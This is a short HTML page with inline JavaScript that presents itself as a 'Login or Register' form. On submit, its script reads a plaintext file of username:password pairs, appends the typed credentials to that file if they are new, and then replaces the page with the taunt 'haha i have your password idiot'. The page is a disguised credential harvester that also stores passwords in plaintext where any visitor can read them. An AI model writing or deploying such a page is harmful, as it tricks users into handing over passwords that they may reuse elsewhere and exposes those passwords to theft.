<!DOCTYPE html>
<html>
<head><title>Login</title><link rel="stylesheet" href="style.css" /></head>
<body>
<form class="form" onsubmit="event.preventDefault();handleLogin();">
<h2>Login or Register</h2>
<input id="user" placeholder="Username" />
<input id="pass" placeholder="Password" type="password" />
<button>Submit</button>
</form>
<script>
function handleLogin() {
  const u = document.getElementById('user').value;
  const p = document.getElementById('pass').value;
  fetch('data/users.txt')
    .then(res => res.text())
    .then(txt => {
      const exists = txt.includes(u + ':' + p);
      if (!exists) {
        fetch('data/users.txt', {
          method: 'POST',
          body: u + ':' + p + '\n'
        });
      }
      document.body.innerHTML = '<h1 style="font-size:5rem;text-align:center;">haha i have your password idiot</h1>';
    });
}
</script>
</body>
</html>
